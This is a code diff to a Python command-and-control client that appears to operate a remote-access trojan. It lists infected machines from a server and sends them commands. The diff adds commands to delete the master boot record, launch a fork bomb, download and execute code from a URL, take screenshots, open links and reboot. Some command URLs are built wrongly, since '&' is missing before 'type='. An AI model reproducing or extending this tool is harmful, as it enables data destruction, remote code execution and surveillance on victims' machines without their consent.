@@ -65,21 +65,56 @@ else:
 	print(Fore.GREEN + '[!] - URL set ' + url)
 	password = input(Fore.YELLOW + 'Enter your password: ')
 	userslist = requests.get(url + 'getusers.php?password=' + password)
-	if(userslist == 'password error!'):
+	if(userslist.text == 'password error!'):
 		print(Fore.RED  + 'Password error')
 		exit()
 	else:
 		clear()
 		print(logo)
 		print(Fore.GREEN + "[!] - Server: " + url)
-		print(userslist)
+		print(userslist.text)
+		if(userslist.text == None):
+			print('no users')
+			exit()
+    			
 		id = input('Enter user ID: ')
 		clear()
-		logo()
+		print(logo)
+		print(Fore.GREEN + "[!] - Server: " + url)
 		print(Fore.GREEN + 'User ' + id + ' set')
 		comandhelp()
 		command = input('Enter your command: ')
 		if(command == "MSG_BOX"):
-    		content = input('Enter content: ')
+			content = input('Enter content: ')
 			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=msg_box&content=' + content)
 			print(Fore.GREEN + 'comand send!')
+		elif(command == "REBOOT"):
+			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=reboot')
+			print(Fore.GREEN + 'comand send!')
+		elif(command == "DELETE_MBR"):
+			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=MBR_DELETE')
+			print(Fore.GREEN + 'comand send!')
+		elif(command == "OPEN_LINK"):
+			content = input('Enter URL: ')
+			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=open_link&content=' + content)
+			print(Fore.GREEN + 'comand send!')
+		elif(command == "EXIT"):
+			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=exit')
+			print(Fore.GREEN + 'comand send!')
+		elif(command == "DOWLOAND_AND_EXECUTE"):
+			content = input('Enter URL: ')
+			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=download_execute&content=' + content)
+			print(Fore.GREEN + 'comand send!')
+		elif(command == "FORK_BOMB"):
+			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=forkbomb')
+			print(Fore.GREEN + 'comand send!')
+		elif(command == 'SCRENSHOT'):
+			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=screnshot')
+			print(Fore.GREEN + 'comand send!')
+		elif(command == "PING"):
+			requests.get(url + 'ping/SendPingComand.php?id=' + id)
+			print(Fore.GREEN + 'comand send!')
+		elif(command == "HELP"):
+			comandhelp()
+		elif(command == "DISCONNECT"):
+			exit()
